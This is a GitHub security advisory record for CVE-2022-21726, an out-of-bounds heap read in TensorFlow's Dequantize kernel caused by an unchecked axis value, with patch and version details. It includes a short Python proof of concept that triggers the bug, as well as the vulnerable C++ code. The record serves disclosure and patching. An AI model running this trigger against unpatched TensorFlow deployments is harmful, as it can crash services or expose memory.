{
    "ghsaId": "GHSA-23hm-7w47-xw72",
    "severity": "HIGH",
    "summary": "Out of bounds read in Tensorflow",
    "description": "### Impact \nThe [implementation of `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153) does not fully validate the value of `axis` and can result in heap OOB accesses:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=tf.constant([1,1],dtype=tf.qint32),\n    min_range=[1.0],\n    max_range=[10.0],\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n```\n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked and this results in reading past the end of the array containing the dimensions of the input tensor:\n    \n```cc   \n  if (axis_ > -1) {\n    num_slices = input.dim_size(axis_);\n  }\n  // ...\n  int64_t pre_dim = 1, post_dim = 1;\n  for (int i = 0; i < axis_; ++i) {\n    pre_dim *= float_output.dim_size(i);\n  }\n  for (int i = axis_ + 1; i < float_output.dims(); ++i) {\n    post_dim *= float_output.dim_size(i);\n  }\n``` \n      \n### Patches\nWe have patched the issue in GitHub commit [23968a8bf65b009120c43b5ebcceaf52dbc9e943](https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n      \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
    "permalink": "https://github.com/advisories/GHSA-23hm-7w47-xw72",
    "publishedAt": "2022-02-09T18:28:54Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-23hm-7w47-xw72"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-21726"
        }
    ]
}